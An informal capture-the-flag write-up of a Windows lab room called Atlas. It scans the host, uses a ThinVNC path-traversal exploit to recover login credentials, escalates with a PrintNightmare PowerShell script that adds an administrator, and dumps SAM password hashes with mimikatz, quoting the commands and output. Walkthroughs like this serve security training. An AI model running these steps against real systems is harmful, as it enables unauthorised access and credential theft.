# Atlas

<img src="atlas.jpg" alt="atlas"/>

they say its an easy windows room for beginners

that is exactly what I am

let's speedrun this

Quick note here...for windows machines -Pn flag for nmap is useful for bypassing IMCP filters

## Enumeration

### Nmap

```
PORT     STATE SERVICE       REASON
3389/tcp open  ms-wbt-server syn-ack
| ssl-cert: Subject: commonName=GAIA
| Issuer: commonName=GAIA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-08-29T20:56:26
| Not valid after:  2022-02-28T20:56:26
| MD5:   4f8e 1595 0ddf 896b f328 382c 74e1 4757
| SHA-1: 0487 ba8b 71a7 25e4 861d 29bd 0dba dde0 8f63 5038
| -----BEGIN CERTIFICATE-----
| MIICzDCCAbSgAwIBAgIQUMxZ1WSDRaRHMk1jQH2EHzANBgkqhkiG9w0BAQsFADAP
| MQ0wCwYDVQQDEwRHQUlBMB4XDTIxMDgyOTIwNTYyNloXDTIyMDIyODIwNTYyNlow
| DzENMAsGA1UEAxMER0FJQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AMFiXWfKB/B0VcofnYBW/8XnUhE5Y659HIJia9Bk5nlG6g9otdGGSktBPGbP6RtX
| TuvWYRdmcIMSgiN66yb6Ow62eVVkdSC2vTP6Lc7FzB/Knm7Liud7TBjsWI1y/I4l
| WsdFnLiZo8yDP+q4WRpHivdrPVGOzuMpMNh7V1sj7k9WToOyHWVWPIhPERdsfHqn
| 1fwAaqGhu0CF7XMhrutMBwJgSzNlTItuYnSPB6dlqBFabVSZpusPc0liTrDg4Q7n
| O9p6ous1W008+zH1V9g+Tp6WDRhDVcLTMv90R2K6dvrLnhVkx5XZzf1AWqiLX7Fa
| xahHm9cJ7WVwYBTV5OZAfGkCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEw
| CwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQBzm8kaotMsW9jzDEtKVVEE
| JahZ+2m09iz6Gn139yz/+mCb62DbnWlGFg1+EbK4T2tvdQKpL+d7zBX9tjSwme8G
| 4RvO+NrrqMuNCdZzgjRIEajgPK9pA+KdtiLW1IwuPHRCvXWPAJ3nTNvU24DaqpxQ
| vF7UPvSiVtEXZ4hCY4GWr9Zb9YDRcjBeyNIMURVkfvOB6c2ty7PxSjxi1oEzXiq/
| IgHS+uYfrpGyB4eQm3DStUkYW3sbmWhEwC9inixHQBnxjmri8s9F+qsAFqpXFaRL
| ycsKZ3Quxgdk8abypg1VmsLEasRHQww0c8JGQKcPCKK5duCC/SJsALa1c/kqrj34
|_-----END CERTIFICATE-----
|_ssl-date: 2021-11-13T19:48:20+00:00; +2m31s from scanner time.
8080/tcp open  http-proxy    syn-ack
| http-methods:
|_  Supported Methods: GET POST
| http-auth:
| HTTP/1.1 401 Access Denied\x0D
|_  Digest qop=auth opaque=tuuGfTR77oSOOo8yc51kRZVFnFhL04AZtx nonce=mqhpaDq85UCI2kMCOrzlQA== realm=ThinVNC
|_http-favicon: Unknown favicon MD5: CEE00174E844FDFEB7F56192E6EC9F5D
|_http-title: 401 Access Denied

Host script results:
|_clock-skew: 2m30s
```

ok let's check the website

```
──╼ $curl 10.10.246.176:8080 -v

- Trying 10.10.246.176:8080...
- Connected to 10.10.246.176 (10.10.246.176) port 8080 (#0)
  > GET / HTTP/1.1
  > Host: 10.10.246.176:8080
  > User-Agent: curl/7.74.0
  > Accept: _/_
- Mark bundle as not supporting multiuse
< HTTP/1.1 401 Access Denied
< Content-Type: text/html
< Content-Length: 144
< Connection: Keep-Alive
< WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="Iqp6PTu85UCo2UwCO7zlQA==", opaque="CgvGrB8X4kGN68i8eMeu5MpmBxMHKgkJ4s"
<
<HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL  requires authorization.<P></BODY></HTML>
- Connection #0 to host 10.10.246.176 left intact
```

thinVnC? what is that? I know vnc but why is this one thin?

Google is my homie

```
└──╼ $searchsploit thinvnc

---

Exploit Title | Path

---

ThinVNC 1.0b1 - Authentication Bypass | windows/remote/47519.py

---

Shellcodes: No Results
```

Thanks MuirlandOracle for CVE-2019-17662.py

I copied that as `thinvnc_exploit.py`

```

└──╼ $python thinvnc_exploit.py 10.10.246.176 8080

---

|\_ _| |\_\_ (_)\_ \_\ \ / / \ | |/ **_|
| | | '_ \| | '_ \ \ / /| \| | |
| | | | | | | | | \ V / | |\ | |_**
|_| |_| |_|_|_| |_|\_/ |\_| \_|\_\_\_\_|

@MuirlandOracle

[+] Credentials Found!
Username: Atlas
Password: H0ldUpTheHe@vens
```

ok this room is hand-holding but I appreciate it

simply put this script does a path traversal on host/port to read the `thinvnc.ini` file (by default)

someting more like `http://host:port/abc/../../ThinVNC.ini`

then reads it and search for Credentials...

`xfreerdp /v:10.10.246.176 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp`

The last part of this command share a folder of target with or own /tmp folder

Thats pretty cool huh?

## privilages escalation

### printnightmare (or cve-2021-1675)

when you hae access to powershell and spool service (printer) is running

think of printnightmare

we clone a powershell implementation of that and copy in our /tmp folder

From atlas machine we open powershell then import the script

`. \\tsclient\share\CVE-2021-1675-main\CVE-2021-1675.ps1`

sometimes you need to download it in powershell via `IEX` command to bypass security policy but tis time we imported it right

Then we start stuff

`Invoke-Nightmare`

wich creates a new admin user for us

```
PS C:\Users\Atlas> . \\tsclient\share\CVE-2021-1675-main\CVE-2021-1675.ps1

PS C:\Users\Atlas> Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_am
d64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
[+] added user as local administrator
[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
```

We could take the simple option of right-clicking on PowerShell or cmd.exe and choosing to "Run as Administrator", but that's no fun. Instead, let's use a hacky little PowerShell command to start a new high-integrity command prompt running as our new administrator.

The command is as follows:
`Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n`

y tho? you ask? for the lulz of course

```
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups

## GROUP INFORMATION

Group Name Type SID Attributes
============================================================= ================ ============ ===============================================================
Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group
LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label S-1-16-12288

C:\Windows\system32>
```

So we are in this group Mandatory Label\High Mandatory Level

means its our machine now (_insert communism meme here_)

where flags? where Credentials? where juicy files? where everything?

we download a release of mimikatz (ignore the danger warning...we are the Danger)

and copy to /tpm...same stuff

`\\tsclient\share\x64\mimikatz.exe`

Now mimikatz commands in action

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id : 0
User name :
SID name : NT AUTHORITY\SYSTEM

676 {0;000003e7} 1 D 24847 NT AUTHORITY\SYSTEM S-1-5-18 (04g,21p) Primary
-> Impersonated !

- Process Token : {0;001ba397} 1 F 1995372 GAIA\adm1n S-1-5-21-1966530601-3185510712-10604624-1009 (13g,24p) Primary
- Thread Token : {0;000003e7} 1 D 2039477 NT AUTHORITY\SYSTEM S-1-5-18 (04g,21p) Impersonation (Delegation)
```

Now the precious hashes

```
mimikatz # lsadump::sam
Domain : GAIA
SysKey : 36c8d26ec0df8b23ce63bcefa6e2d821
Local SID : S-1-5-21-1966530601-3185510712-10604624

SAMKey : 6e708461100b4988991ce3b4d8b1784e

RID : 000001f4 (500)
User : Administrator
Hash NTLM: c16444961f67af7eea7e420b65c8c3eb

Supplemental Credentials:

- Primary:NTLM-Strong-NTOWF \*
  Random Value : efd8f5fd23c3b910ef609e3e872276c8

- Primary:Kerberos-Newer-Keys \*
  Default Salt : CHANGE-MY-HOSTNAMEAdministrator
  Default Iterations : 4096
  Credentials
  aes256_hmac (4096) : c3bfc4a1912ab98abb75ad9d11aa511e30673f6c495066a811032df9756b9f3e
  aes128_hmac (4096) : 6fbcc5a35c6507e1dd2c51521557b3b6
  des_cbc_md5 (4096) : 9ba7cdb3972013cd
  OldCredentials
  aes256_hmac (4096) : 9484aadacd6c5994aed633bf92b6b3db31c57c932d2cd84a7fa635a0b3262806
  aes128_hmac (4096) : cdda685dd630dd0796e5ddf38e22dce5
  des_cbc_md5 (4096) : 08340db613fb46b5
  OlderCredentials
  aes256_hmac (4096) : 50141e3b3b449512e393a66c32e7f89a131744eef5d8a3f6a8576919a810cda3
  aes128_hmac (4096) : 0d717b42dbaf77bb7248b4bebf8bb3a6
  des_cbc_md5 (4096) : bc23a20170542f25

- Packages \*
  NTLM-Strong-NTOWF

- Primary:Kerberos \*
  Default Salt : CHANGE-MY-HOSTNAMEAdministrator
  Credentials
  des_cbc_md5 : 9ba7cdb3972013cd
  OldCredentials
  des_cbc_md5 : 08340db613fb46b5

RID : 000001f5 (501)
User : Guest

RID : 000001f7 (503)
User : DefaultAccount

RID : 000001f8 (504)
User : WDAGUtilityAccount
Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

Supplemental Credentials:

- Primary:NTLM-Strong-NTOWF \*
  Random Value : a1528cd40d99e5dfa9fa0809af998696

- Primary:Kerberos-Newer-Keys \*
  Default Salt : WDAGUtilityAccount
  Default Iterations : 4096
  Credentials
  aes256_hmac (4096) : 3ff137e53cac32e3e3857dc89b725fd62ae4eee729c1c5c077e54e5882d8bd55
  aes128_hmac (4096) : 15ac5054635c97d02c174ee3aa672227
  des_cbc_md5 (4096) : ce9b2cabd55df4ce

- Packages \*
  NTLM-Strong-NTOWF

- Primary:Kerberos \*
  Default Salt : WDAGUtilityAccount
  Credentials
  des_cbc_md5 : ce9b2cabd55df4ce

RID : 000003f0 (1008)
User : Atlas
Hash NTLM: 95ab4a5008e6266db4124279bbf2d70c

Supplemental Credentials:

- Primary:NTLM-Strong-NTOWF \*
  Random Value : 9a29c51aca19edf492ca5543c224fd93

- Primary:Kerberos-Newer-Keys \*
  Default Salt : GAIAAtlas
  Default Iterations : 4096
  Credentials
  aes256_hmac (4096) : 31b9d2630afe8409043cf0aff5d14cac90b2b12655be040bb11de51ca098ecaa
  aes128_hmac (4096) : f1907d517c4a8cc9cb5e2c4607a47f2c
  des_cbc_md5 (4096) : f8efef5e3ece8076
  OldCredentials
  aes256_hmac (4096) : ba311b1a6f964cdcb2988045aad04074458aab5264fdbdb394a6614476353350
  aes128_hmac (4096) : 1a8cb078c086419390f2dfc8e81e3e18
  des_cbc_md5 (4096) : dff41c61ea4967c8

- Packages \*
  NTLM-Strong-NTOWF

- Primary:Kerberos \*
  Default Salt : GAIAAtlas
  Credentials
  des_cbc_md5 : f8efef5e3ece8076
  OldCredentials
  des_cbc_md5 : dff41c61ea4967c8

RID : 000003f1 (1009)
User : adm1n
Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Supplemental Credentials:

- Primary:NTLM-Strong-NTOWF \*
  Random Value : 0820f6f821c0733b67e449be5656830d

- Primary:Kerberos-Newer-Keys \*
  Default Salt : GAIAadm1n
  Default Iterations : 4096
  Credentials
  aes256_hmac (4096) : c8c242756234f40bcc0f4fd115fde31bf7103b57f0a3e9d4b687878908132548
  aes128_hmac (4096) : 93b364e4c0918b89ac64d429ceb37283
  des_cbc_md5 (4096) : bc3215971f7c4525

- Packages \*
  NTLM-Strong-NTOWF

- Primary:Kerberos \*
  Default Salt : GAIAadm1n
  Credentials
  des_cbc_md5 : bc3215971f7c4525
```

we can see admin NTLM hash:
c16444961f67af7eea7e420b65c8c3eb

we could crack that with hashcat + rockyou (maybe) but hey...its over

I also stole that nice atlas wallpaper (found in images folder) it looks so cool

I just copy-pasted it in my share

And Now i used it as a header banner in this document
